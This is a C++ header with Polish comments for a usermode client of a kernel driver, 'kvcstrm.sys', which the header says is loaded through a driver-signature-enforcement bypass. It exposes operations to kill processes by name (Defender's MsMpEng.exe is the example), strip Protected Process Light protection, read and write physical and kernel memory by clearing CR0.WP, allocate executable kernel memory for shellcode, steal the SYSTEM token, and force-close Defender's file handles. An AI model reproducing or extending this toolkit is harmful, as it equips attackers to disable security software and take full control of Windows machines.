// KvcStrmClient.h
// Usermode C++ wrapper dla wszystkich IOCTL kvcstrm.sys
//
// kvcstrm musi byc zaladowany przez:
//   kvc driver load kvcstrm
// (DSE bypass via kvc.sys, zapis przez TrustedInstaller)
//
// Uzycie:
//   KvcStrmClient strm;
//   if (!strm.Open()) { /* blad */ }
//   strm.KillProcess(pid);
//   strm.SetProtection(pid, offset, 0x62);   // PPL Antimalware
//   strm.ElevateToken(pid, tokenOffset);
//   strm.Close();

#pragma once

#include "common.h"
#include <optional>
#include <span>
#include <vector>

// NTSTATUS codes for usermode builds (no DDK / ntstatus.h dependency)
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif
#ifndef STATUS_DEVICE_NOT_CONNECTED
#define STATUS_DEVICE_NOT_CONNECTED ((NTSTATUS)0xC000009DL)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Ponowne deklaracje struktur z kvcstrm.h - self-contained, bez zaleznosci od DDK
// (te struktury sa wspolne dla usermode i kernelmode)

#pragma pack(push, 8)

struct KVCSTRM_READWRITE_REQUEST {
    ULONG    ProcessId;
    ULONG64  Address;
    ULONG64  Buffer;
    SIZE_T   Size;
    BOOL     Write;
    NTSTATUS Status;
};

struct KVCSTRM_BULK_OPERATION {
    ULONG                       Count;
    KVCSTRM_READWRITE_REQUEST   Operations[64];   // MAX_BULK_OPERATIONS
};

struct KVCSTRM_KILL_REQUEST {
    ULONG    ProcessId;
    NTSTATUS Status;
};

struct KVCSTRM_PROTECTION_REQUEST {
    ULONG    ProcessId;
    ULONG64  ProtectionOffset;
    UCHAR    ProtectionValue;
    UCHAR    Padding[3];
    NTSTATUS Status;
};

struct KVCSTRM_PHYSMEM_REQUEST {
    ULONG64  PhysicalAddress;
    ULONG64  Buffer;
    SIZE_T   Size;
    NTSTATUS Status;
};

struct KVCSTRM_ALLOC_REQUEST {
    SIZE_T   Size;
    ULONG    Flags;
    ULONG64  Address;
    NTSTATUS Status;
};

struct KVCSTRM_FREE_REQUEST {
    ULONG64  Address;
    NTSTATUS Status;
};

struct KVCSTRM_PROTECTED_WRITE_REQUEST {
    ULONG64  DstAddress;
    SIZE_T   Size;
    NTSTATUS Status;
    // Payload bytes follow immediately after this struct
};

struct KVCSTRM_TOKEN_REQUEST {
    ULONG    ProcessId;
    ULONG64  TokenOffset;
    NTSTATUS Status;
};

struct KVCSTRM_KILL_NAME_REQUEST {
    char     ProcessName[16];
    ULONG    KilledCount;
    NTSTATUS Status;
};

struct KVCSTRM_CLOSE_HANDLE_REQUEST {
    ULONG    ProcessId;
    HANDLE   HandleValue;
    NTSTATUS Status;
};

#pragma pack(pop)

// ============================================================
// STALE WARTOSCI OCHRONY EPROCESS (PS_PROTECTION byte)
// ============================================================

namespace PsProtection {
    constexpr UCHAR None              = 0x00;  // Brak ochrony
    constexpr UCHAR PPL_Windows       = 0x61;  // PPL Windows   (Type=1, Signer=6)
    constexpr UCHAR PPL_Antimalware   = 0x62;  // PPL Antimalware (Type=2, Signer=6)
    constexpr UCHAR PP_Antimalware    = 0x72;  // PP  Antimalware (Type=2, Signer=7)
    constexpr UCHAR PP_Tcb            = 0x51;  // PP  TCB        (Type=1, Signer=5)
    constexpr UCHAR PPL_Authenticode  = 0x22;  // PPL Authenticode (Type=2, Signer=2)
}

// ============================================================
// FLAGI ALOKACJI KERNEL POOL
// ============================================================

namespace KernelAllocFlags {
    constexpr ULONG NonPaged          = 0x00;  // Non-paged, nie wykonywalny
    constexpr ULONG NonPagedExecute   = 0x01;  // Non-paged + wykonywalny (shellcode/patch)
}

// ============================================================
// WYNIK OPERACJI - wrapper NTSTATUS z opisem bledu
// ============================================================

struct StrmResult {
    NTSTATUS ntStatus = STATUS_SUCCESS;
    bool     ok       = true;

    explicit operator bool()  const noexcept { return ok; }
    bool IsSuccess()          const noexcept { return ok; }

    static StrmResult Ok()                    noexcept { return { STATUS_SUCCESS, true }; }
    static StrmResult Fail(NTSTATUS s)        noexcept { return { s, false }; }
    static StrmResult WinFail()               noexcept { return { HRESULT_FROM_WIN32(GetLastError()), false }; }
};

// ============================================================
// GLOWNA KLASA KLIENTA
// ============================================================

class KvcStrmClient {
public:
    KvcStrmClient()  = default;
    ~KvcStrmClient() { Close(); }

    KvcStrmClient(const KvcStrmClient&)            = delete;
    KvcStrmClient& operator=(const KvcStrmClient&) = delete;
    KvcStrmClient(KvcStrmClient&&)                 noexcept = default;
    KvcStrmClient& operator=(KvcStrmClient&&)      noexcept = default;

    // ---- Zarzadzanie polaczeniem ----

    bool Open()  noexcept;   // Otworz \\.\kvcstrm
    void Close() noexcept;   // Zamknij uchwyt
    bool IsOpen() const noexcept { return m_handle != INVALID_HANDLE_VALUE && m_handle != nullptr; }

    // ---- Wirtualna pamiec R/W ----

    StrmResult ReadVirtualMemory(ULONG pid, ULONG64 address,
                                 void* buffer, SIZE_T size) noexcept;

    StrmResult WriteVirtualMemory(ULONG pid, ULONG64 address,
                                  const void* buffer, SIZE_T size) noexcept;

    // Wygodne szablony dla typow skalarnych
    template<typename T>
    std::optional<T> Read(ULONG pid, ULONG64 address) noexcept {
        T val{};
        auto r = ReadVirtualMemory(pid, address, &val, sizeof(T));
        if (!r) return std::nullopt;
        return val;
    }

    template<typename T>
    bool Write(ULONG pid, ULONG64 address, const T& val) noexcept {
        return WriteVirtualMemory(pid, address, &val, sizeof(T)).ok;
    }

    // Bulk R/W — do 64 operacji w jednym IOCTL
    StrmResult BulkTransfer(KVCSTRM_BULK_OPERATION& bulk) noexcept;

    // ---- Zabijanie procesow ----

    StrmResult KillProcess(ULONG pid) noexcept;                    // via kernel handle
    StrmResult KillProcessLegacy(ULONG pid) noexcept;              // WESMAR (raw PID)
    StrmResult KillProcessesByName(const char* name,               // np. "MsMpEng.exe"
                                   ULONG* killedCount = nullptr) noexcept;

    // ---- Manipulacja PP/PPL ----
    //
    // protectionOffset: offset bajtu PS_PROTECTION w EPROCESS
    //   Pobierz przez SymbolEngine lub OffsetFinder z PDB.
    //   Typowe wartosci:
    //     Win11 22H2/23H2 = 0x87A
    //     Win10 21H2      = 0x6FA
    //
    // protectionValue: PsProtection::* stale powyzej
    //   0x00 = usuwa ochrone
    //   0x62 = PPL Antimalware (chroni proces przed zabiciem przez user-mode)

    StrmResult SetProtection(ULONG pid,
                             ULONG64 protectionOffset,
                             UCHAR   protectionValue) noexcept;

    // Wygodne skroty dla DefenderManager / self-protection
    StrmResult ProtectAsPPL_Antimalware(ULONG pid, ULONG64 protOffset) noexcept {
        return SetProtection(pid, protOffset, PsProtection::PPL_Antimalware);
    }
    StrmResult ProtectAsPP_Antimalware(ULONG pid, ULONG64 protOffset) noexcept {
        return SetProtection(pid, protOffset, PsProtection::PP_Antimalware);
    }
    StrmResult RemoveProtection(ULONG pid, ULONG64 protOffset) noexcept {
        return SetProtection(pid, protOffset, PsProtection::None);
    }

    // ---- Fizyczna pamiec R/W ----
    // Max 256 KB per operacja (MAX_PHYSMEM_SIZE). Tylko zwykly RAM (nie MMIO).

    StrmResult ReadPhysicalMemory(ULONG64 physAddr,
                                  void* buffer, SIZE_T size) noexcept;

    StrmResult WritePhysicalMemory(ULONG64 physAddr,
                                   const void* buffer, SIZE_T size) noexcept;

    // ---- Alokacja/zwolnienie kernel pool ----

    // Zwraca adres kernelowy albo 0 przy bledzie.
    // flags: KernelAllocFlags::*
    // UWAGA: adres musi byc zwolniony przez FreeKernelMemory - nie przez zadna inna droge!
    ULONG64 AllocKernelMemory(SIZE_T size,
                              ULONG flags = KernelAllocFlags::NonPaged) noexcept;

    StrmResult FreeKernelMemory(ULONG64 address) noexcept;

    // ---- Zapis do chronionej (read-only) pamieci kernela ----
    // HVCI musi byc wylaczone (jesli kvcstrm sie zaladuwal, jest wylaczone).
    // Technika: chwilowe wyczyszczenie CR0.WP + copy + przywrocenie.

    StrmResult WriteProtectedKernelMemory(ULONG64 dstAddress,
                                          const void* data,
                                          SIZE_T size) noexcept;

    // ---- Kradniecie tokena SYSTEM ----
    //
    // tokenOffset: offset pola Token (EX_FAST_REF) w EPROCESS
    //   Pobierz przez SymbolEngine.
    //   Typowe wartosci:
    //     Win11 26200 = 0x4B8
    //     Win11 22H2  = 0x4B8
    //     Win10 21H2  = 0x4B8
    //
    // Po wykonaniu: targetProcess dziala z pelnym NT AUTHORITY\SYSTEM

    StrmResult ElevateToken(ULONG pid, ULONG64 tokenOffset) noexcept;

    // ---- Force-close uchwytu w innym procesie ----
    // Uzyteczne gdy MsMpEng trzyma uchwyt do chronionego pliku.

    StrmResult ForceCloseHandle(ULONG pid, HANDLE handleValue) noexcept;

    // ---- Diagnostyka ----

    // Sprawdz czy driver jest zaladowany (uchwyt mozna otworzyc)
    static bool IsDriverLoaded() noexcept;

private:
    HANDLE m_handle = INVALID_HANDLE_VALUE;

    // Generyczny helper IOCTL: inBuf == outBuf (METHOD_BUFFERED z tym samym buforem)
    StrmResult Ioctl(DWORD code, void* buf, DWORD size) noexcept;

    // Helper dla IOCTL z osobnym payload za headerem (IOCTL_WRITE_PROTECTED)
    StrmResult IoctlWithPayload(DWORD code, void* header, DWORD headerSize,
                                const void* payload, SIZE_T payloadSize) noexcept;

    static constexpr const wchar_t* DEVICE_PATH = L"\\\\.\\kvcstrm";

    // IOCTL kody (identyczne z kvcstrm.h)
    static constexpr DWORD IOCTL_VM_READ       = 0x00222000;  // CTL_CODE(0x22, 0x800, 0, 0)
    static constexpr DWORD IOCTL_VM_WRITE      = 0x00222004;  // CTL_CODE(0x22, 0x801, 0, 0)
    static constexpr DWORD IOCTL_VM_BULK       = 0x00222008;  // CTL_CODE(0x22, 0x802, 0, 0)
    static constexpr DWORD IOCTL_KILL          = 0x0022200C;  // CTL_CODE(0x22, 0x803, 0, 0)
    static constexpr DWORD IOCTL_KILL_WESMAR  = 0x22201C;
    static constexpr DWORD IOCTL_SET_PROT      = 0x00222010;  // CTL_CODE(0x22, 0x804, 0, 0)
    static constexpr DWORD IOCTL_PHYS_READ     = 0x00222014;  // CTL_CODE(0x22, 0x805, 0, 0)
    static constexpr DWORD IOCTL_PHYS_WRITE    = 0x00222018;  // CTL_CODE(0x22, 0x806, 0, 0)
    static constexpr DWORD IOCTL_ALLOC         = 0x0022202C;  // CTL_CODE(0x22, 0x80B, 0, 0)
    static constexpr DWORD IOCTL_FREE          = 0x00222020;  // CTL_CODE(0x22, 0x808, 0, 0)
    static constexpr DWORD IOCTL_WRITE_PROT    = 0x00222024;  // CTL_CODE(0x22, 0x809, 0, 0)
    static constexpr DWORD IOCTL_ELEVATE       = 0x00222028;  // CTL_CODE(0x22, 0x80A, 0, 0)
    static constexpr DWORD IOCTL_KILL_NAME     = 0x00222040;  // CTL_CODE(0x22, 0x810, 0, 0)
    static constexpr DWORD IOCTL_FORCE_HANDLE  = 0x00222044;  // CTL_CODE(0x22, 0x811, 0, 0)
};
